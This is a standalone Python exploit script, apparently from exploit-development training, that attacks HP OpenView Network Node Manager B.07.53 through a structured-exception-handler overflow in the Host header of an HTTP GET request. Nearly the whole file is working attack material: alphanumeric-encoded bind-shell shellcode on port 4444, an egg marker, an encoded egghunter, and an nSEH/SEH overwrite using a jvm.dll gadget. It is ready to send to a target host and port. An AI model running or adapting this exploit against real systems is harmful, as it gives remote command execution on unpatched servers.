#!/usr/bin/env python3

# author: greyshell
# description: shell_bind_tcp payload (port 4444)

import socket

# global constant variable
HOST = "172.16.116.198"
PORT = "7510"


def main():
    # max crash buff length = 3780
    total_len_buff = 3780

    initial_buff = "A" * 3305

    egg_marker = "T00WT00W"  # all chars are safe

    # PUSH EDI
    # POP EAX
    # ADD AX, 0xb01
    # PUSH EAX
    # POP ESP
    # string literal: "\x57\x58\x66\x05\x01\x0B\x50\x5C"
    esp_setup_shellcode = "\x57\x58\x66\x05\x01\x0B\x50\x5C"

    # msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -f hex
    # payload = esp_adjust_by_4_logic + shell_bind_tcp shellcode
    # python alpha_num_encoder.py -p payload.txt -b bad_chars.txt
    encoded_shellcode = ("\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x38\x55\x63\x2d\x55\x38\x55\x63\x2d\x56\x3c"
                         "\x56\x63\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x2e\x30\x31\x2d\x4f\x2e\x30\x31"
                         "\x2d\x4f\x31\x30\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x53\x6c\x3d\x2d\x2d"
                         "\x53\x6c\x3d\x2d\x31\x54\x6c\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x52\x2a\x56"
                         "\x5f\x2d\x52\x2a\x56\x5f\x2d\x52\x2b\x58\x60\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
                         "\x63\x3e\x53\x2b\x2d\x63\x3e\x53\x2b\x2d\x65\x46\x53\x2d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
                         "\x31\x2a\x2d\x23\x6b\x20\x55\x2d\x23\x6b\x20\x55\x2d\x25\x6c\x21\x56\x50\x25\x4a\x4d\x4e\x55"
                         "\x25\x35\x32\x31\x2a\x2d\x5f\x35\x32\x73\x2d\x5f\x35\x32\x73\x2d\x60\x37\x33\x73\x50\x25\x4a"
                         "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63\x6b\x71\x68\x2d\x63\x6b\x71\x68\x2d\x65\x6d\x72\x69"
                         "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x28\x4b\x35\x55\x2d\x28\x4b\x35\x55\x2d\x29"
                         "\x4c\x35\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x44\x32\x52\x2d\x55\x44\x32"
                         "\x52\x2d\x57\x46\x33\x53\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x60\x39\x38\x3c\x2d"
                         "\x60\x39\x38\x3c\x2d\x60\x3e\x39\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x28\x55"
                         "\x63\x27\x2d\x28\x55\x63\x27\x2d\x2a\x56\x63\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
                         "\x2d\x32\x2c\x66\x3e\x2d\x32\x2c\x66\x3e\x2d\x34\x2e\x67\x43\x50\x25\x4a\x4d\x4e\x55\x25\x35"
                         "\x32\x31\x2a\x2d\x37\x38\x38\x38\x2d\x37\x38\x38\x38\x2d\x3c\x39\x3c\x39\x50\x25\x4a\x4d\x4e"
                         "\x55\x25\x35\x32\x31\x2a\x2d\x37\x3c\x38\x3b\x2d\x37\x3c\x38\x3b\x2d\x3c\x41\x39\x3b\x50\x25"
                         "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x39\x38\x38\x2d\x38\x39\x38\x38\x2d\x3c\x3d\x39"
                         "\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x68\x54\x3d\x2d\x50\x68\x54\x3d\x2d"
                         "\x50\x69\x56\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x26\x3d\x49\x2d\x55\x26"
                         "\x3d\x49\x2d\x55\x26\x41\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3d\x49\x41\x54"
                         "\x2d\x3d\x49\x41\x54\x2d\x42\x49\x41\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f"
                         "\x55\x32\x68\x2d\x5f\x55\x32\x68\x2d\x60\x57\x34\x68\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
                         "\x2a\x2d\x32\x4f\x37\x38\x2d\x32\x4f\x37\x38\x2d\x32\x4f\x38\x39\x50\x25\x4a\x4d\x4e\x55\x25"
                         "\x35\x32\x31\x2a\x2d\x38\x38\x44\x58\x2d\x38\x38\x44\x58\x2d\x39\x38\x46\x59\x50\x25\x4a\x4d"
                         "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x27\x5e\x37\x2d\x55\x27\x5e\x37\x2d\x56\x28\x60\x39\x50"
                         "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x34\x30\x33\x2d\x32\x34\x30\x33\x2d\x34\x34"
                         "\x32\x35\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3b\x34\x55\x63\x2d\x3b\x34\x55\x63"
                         "\x2d\x3d\x36\x56\x63\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x23\x32\x2e\x30\x2d\x23"
                         "\x32\x2e\x30\x2d\x23\x33\x2e\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x55\x63"
                         "\x37\x2d\x5f\x55\x63\x37\x2d\x61\x55\x63\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
                         "\x32\x2d\x5b\x41\x2d\x32\x2d\x5b\x41\x2d\x34\x31\x5d\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
                         "\x31\x2a\x2d\x55\x55\x63\x37\x2d\x55\x55\x63\x37\x2d\x57\x55\x63\x39\x50\x25\x4a\x4d\x4e\x55"
                         "\x25\x35\x32\x31\x2a\x2d\x32\x6d\x5c\x42\x2d\x32\x6d\x5c\x42\x2d\x34\x6e\x5d\x42\x50\x25\x4a"
                         "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x33\x55\x63\x37\x2d\x33\x55\x63\x37\x2d\x33\x56\x63\x39"
                         "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x69\x61\x42\x2d\x32\x69\x61\x42\x2d\x34"
                         "\x6b\x61\x43\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x4f\x38\x38\x2d\x32\x4f\x38"
                         "\x38\x2d\x32\x51\x39\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x36\x27\x5d\x2d"
                         "\x4f\x36\x27\x5d\x2d\x51\x37\x28\x5f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x23\x32"
                         "\x54\x55\x2d\x23\x32\x54\x55\x2d\x23\x33\x55\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
                         "\x2d\x60\x5f\x55\x63\x2d\x60\x5f\x55\x63\x2d\x61\x60\x55\x63\x50\x25\x4a\x4d\x4e\x55\x25\x35"
                         "\x32\x31\x2a\x2d\x39\x32\x5c\x4f\x2d\x39\x32\x5c\x4f\x2d\x3e\x33\x5d\x51\x50\x25\x4a\x4d\x4e"
                         "\x55\x25\x35\x32\x31\x2a\x2d\x56\x3e\x39\x3e\x2d\x56\x3e\x39\x3e\x2d\x57\x42\x3d\x43\x50\x25"
                         "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x52\x37\x39\x5f\x2d\x52\x37\x39\x5f\x2d\x54\x38\x3d"
                         "\x5f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x63\x31\x2d\x55\x55\x63\x31\x2d"
                         "\x56\x56\x63\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x47\x2a\x31\x2d\x32\x47"
                         "\x2a\x31\x2d\x34\x48\x2b\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x47\x69\x37\x39"
                         "\x2d\x47\x69\x37\x39\x2d\x49\x69\x3c\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x25"
                         "\x54\x55\x55\x2d\x25\x54\x55\x55\x2d\x26\x56\x55\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
                         "\x2a\x2d\x53\x55\x63\x6c\x2d\x53\x55\x63\x6c\x2d\x53\x56\x63\x6e\x50\x25\x4a\x4d\x4e\x55\x25"
                         "\x35\x32\x31\x2a\x2d\x32\x3b\x2d\x48\x2d\x32\x3b\x2d\x48\x2d\x34\x3d\x2e\x49\x50\x25\x4a\x4d"
                         "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2e\x44\x35\x39\x2d\x2e\x44\x35\x39\x2d\x31\x45\x36\x39\x50"
                         "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x32\x2d\x2d\x55\x55\x32\x2d\x2d\x56\x55"
                         "\x33\x2e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x36\x32\x44\x44\x2d\x36\x32\x44\x44"
                         "\x2d\x37\x33\x44\x45\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x4f\x5c\x25\x2d\x27"
                         "\x4f\x5c\x25\x2d\x27\x4f\x5c\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x60\x35\x35"
                         "\x37\x2d\x60\x35\x35\x37\x2d\x60\x35\x36\x37\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
                         "\x37\x37\x39\x55\x2d\x37\x37\x39\x55\x2d\x39\x37\x3c\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
                         "\x31\x2a\x2d\x49\x36\x36\x34\x2d\x49\x36\x36\x34\x2d\x4a\x38\x38\x36\x50\x25\x4a\x4d\x4e\x55"
                         "\x25\x35\x32\x31\x2a\x2d\x65\x27\x3d\x49\x2d\x65\x27\x3d\x49\x2d\x66\x27\x41\x49\x50\x25\x4a"
                         "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x53\x26\x54\x2d\x27\x53\x26\x54\x2d\x27\x55\x28\x56"
                         "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x4b\x54\x64\x2d\x38\x4b\x54\x64\x2d\x38"
                         "\x4d\x56\x64\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x51\x3c\x26\x2d\x27\x51\x3c"
                         "\x26\x2d\x27\x51\x3c\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x49\x54\x64\x32\x2d"
                         "\x49\x54\x64\x32\x2d\x4a\x56\x64\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5e\x37"
                         "\x26\x37\x2d\x5e\x37\x26\x37\x2d\x60\x38\x28\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
                         "\x2d\x41\x2b\x49\x2e\x2d\x41\x2b\x49\x2e\x2d\x43\x2c\x49\x2e\x50\x25\x4a\x4d\x4e\x55\x25\x35"
                         "\x32\x31\x2a\x2d\x58\x53\x2b\x57\x2d\x58\x53\x2b\x57\x2d\x5a\x55\x2c\x59\x50\x25\x4a\x4d\x4e"
                         "\x55\x25\x35\x32\x31\x2a\x2d\x68\x42\x5f\x2c\x2d\x68\x42\x5f\x2c\x2d\x69\x42\x61\x31\x50\x25"
                         "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6a\x65\x50\x54\x2d\x6a\x65\x50\x54\x2d\x6b\x65\x51"
                         "\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63\x44\x55\x70\x2d\x63\x44\x55\x70\x2d"
                         "\x64\x45\x56\x72\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x43\x26\x54\x2d\x27\x43"
                         "\x26\x54\x2d\x27\x45\x28\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4d\x5e\x41\x3c"
                         "\x2d\x4d\x5e\x41\x3c\x2d\x4e\x60\x42\x3e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55"
                         "\x64\x26\x3c\x2d\x55\x64\x26\x3c\x2d\x55\x64\x27\x3e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
                         "\x2a\x2d\x39\x26\x37\x4a\x2d\x39\x26\x37\x4a\x2d\x3d\x28\x38\x4b\x50\x25\x4a\x4d\x4e\x55\x25"
                         "\x35\x32\x31\x2a\x2d\x5f\x3c\x54\x64\x2d\x5f\x3c\x54\x64\x2d\x5f\x3e\x56\x66\x50\x25\x4a\x4d"
                         "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x3b\x4f\x2d\x2d\x27\x3b\x4f\x2d\x2d\x27\x3d\x50\x2d\x50"
                         "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x26\x3c\x41\x2d\x50\x26\x3c\x41\x2d\x50\x28"
                         "\x3d\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x38\x26\x39\x2d\x39\x38\x26\x39"
                         "\x2d\x3c\x38\x28\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x68\x5e\x59\x2d\x55"
                         "\x68\x5e\x59\x2d\x55\x68\x60\x5a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4a\x6a\x65"
                         "\x50\x2d\x4a\x6a\x65\x50\x2d\x4c\x6a\x65\x51\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
                         "\x35\x2b\x54\x46\x2d\x35\x2b\x54\x46\x2d\x35\x2d\x55\x47\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
                         "\x31\x2a\x2d\x45\x55\x70\x3e\x2d\x45\x55\x70\x3e\x2d\x45\x56\x72\x46\x50\x25\x4a\x4d\x4e\x55"
                         "\x25\x35\x32\x31\x2a\x2d\x50\x6d\x3c\x48\x2d\x50\x6d\x3c\x48\x2d\x51\x6e\x3c\x49\x50\x25\x4a"
                         "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4e\x26\x2e\x47\x2d\x4e\x26\x2e\x47\x2d\x50\x28\x31\x49"
                         "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x51\x26\x39\x2d\x39\x51\x26\x39\x2d\x3c"
                         "\x51\x28\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x39\x45\x26\x2d\x27\x39\x45"
                         "\x26\x2d\x27\x3d\x45\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5e\x44\x6a\x33\x2d"
                         "\x5e\x44\x6a\x33\x2d\x5f\x45\x6b\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55"
                         "\x35\x27\x2d\x55\x55\x35\x27\x2d\x56\x55\x35\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
                         "\x2d\x56\x5c\x29\x55\x2d\x56\x5c\x29\x55\x2d\x58\x5e\x2a\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35"
                         "\x32\x31\x2a\x2d\x58\x59\x47\x63\x2d\x58\x59\x47\x63\x2d\x59\x59\x47\x65\x50\x25\x4a\x4d\x4e"
                         "\x55\x25\x35\x32\x31\x2a\x2d\x54\x55\x55\x55\x2d\x54\x55\x55\x55\x2d\x54\x55\x55\x55\x50\x25"
                         "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x44\x64\x6b\x2d\x38\x44\x64\x6b\x2d\x38\x46\x65"
                         "\x6d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x29\x5b\x4f\x39\x2d\x29\x5b\x4f\x39\x2d"
                         "\x2b\x5d\x50\x39\x50")

    initial_buff = egg_marker + esp_setup_shellcode + encoded_shellcode + "A" * (
            len(initial_buff) - len(egg_marker) - len(esp_setup_shellcode) - len(encoded_shellcode))

    # 1035FE34   48               DEC EAX
    # 1035FE35   48               DEC EAX
    # 1035FE36   77 04            JA SHORT 1035FE59
    # little endian format: "\x4c\x4c\x77\x04"  ==> bad char friendly
    nseh = "\x48\x48\x77\x04"

    # 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR:
    # False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP
    # OpenView\jre\jreActive\bin\client\jvm.dll)
    seh = (0x6d6e394a.to_bytes(4, 'little')).decode('ISO-8859-1')

    # setting up ESP dynamically to bypassing ASLR protection
    # 2216FDF0   58               POP EAX
    # 2216FDF8   66:05 2C01       ADD AX,12C
    # 2216FDF6   50               PUSH EAX
    # 2216FDF7   5C               POP ESP

    esp_setup = "\x58\x66\x05\x2c\x01\x50\x5c"

    # !mona encode ascii -t alphanum -b '\x00\x0a\x0d\x2f\x3a\x3f\x40\x80..\xff' -s
    # 6681CAFF0F42526A0258CD2E3C055A74EFB8543030578BFAAF75EAAF75E7FFE7
    encoded_egghunter = (
        "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x5d\x55\x5d\x2d\x2d\x5d\x55\x5d\x2d\x31\x5e\x55\x5d\x50\x25"
        "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x2c\x5c\x6f\x2d\x70\x2c\x5c\x6f\x2d\x71\x31\x5d\x71\x50\x25\x4a"
        "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x38\x26\x57\x2d\x45\x38\x26\x57\x2d\x46\x38\x28\x57\x50\x25\x4a\x4d"
        "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5b\x6c\x37\x45\x2d\x5b\x6c\x37\x45\x2d\x5b\x6e\x3c\x45\x50\x25\x4a\x4d\x4e"
        "\x55\x25\x35\x32\x31\x2a\x2d\x41\x53\x37\x2d\x2d\x41\x53\x37\x2d\x2d\x42\x54\x37\x31\x50\x25\x4a\x4d\x4e\x55"
        "\x25\x35\x32\x31\x2a\x2d\x54\x37\x66\x45\x2d\x54\x37\x66\x45\x2d\x56\x39\x66\x46\x50\x25\x4a\x4d\x4e\x55\x25"
        "\x35\x32\x31\x2a\x2d\x50\x3e\x39\x31\x2d\x50\x3e\x39\x31\x2d\x51\x41\x3b\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35"
        "\x32\x31\x2a\x2d\x33\x2a\x67\x55\x2d\x33\x2a\x67\x55\x2d\x34\x2a\x67\x55\x50")

    # replaced the "D" buffer with "A" buffer to protect from ESP corruption because D will be interpreted as INC ESP
    buff_last = "A" * (
            total_len_buff - len(initial_buff) - len(nseh) - len(seh) - len(esp_setup) - len(encoded_egghunter))

    crash = initial_buff + nseh + seh + esp_setup + encoded_egghunter + buff_last

    # preparing the GET request
    buffer = "GET /topology/homeBaseView HTTP/1.1\r\n"
    buffer += "Host: " + crash + "\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
    buffer += "Content-Length: 1048580\r\n\r\n"

    print(f"[+] sending evil GET HTTP request to HP NNM -B.07.53, hosted on {HOST}:{PORT}")
    print(f"[+] sent buffer length: {len(crash)}")
    exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exploit.connect((HOST, int(PORT)))
    exploit.send(buffer.encode())
    exploit.close()


if __name__ == "__main__":
    main()
